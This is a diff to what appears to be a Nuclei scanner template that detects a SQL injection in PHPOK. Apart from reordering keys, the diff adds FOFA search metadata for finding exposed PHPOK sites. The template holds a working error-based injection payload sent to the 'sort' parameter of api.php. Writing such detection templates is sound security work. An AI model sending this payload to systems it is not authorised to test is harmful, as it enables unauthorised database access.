@@ -1,5 +1,4 @@
 id: phpok-sqli
-
 info:
   name: PHPOK - SQL Injection
   author: ritikchaddha
@@ -13,22 +12,21 @@ info:
     cwe-id: CWE-89
     cpe: cpe:2.3:a:phpok:phpok:*:*:*:*:*:*:*:*
   metadata:
-    verified: true
+    fofa-query: app="phpok"
     max-request: 1
+    product: phpok
     vendor: phpok
+    verified: true
   tags: phpok,sqli,vuln
 variables:
   num: "999999999"
-
 http:
-  - method: GET
-    path:
-      - '{{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: body
+  - matchers:
+      - part: body
+        type: word
         words:
           - '{{md5({{num}})}}'
-
+    matchers-condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{num}}))) --+'
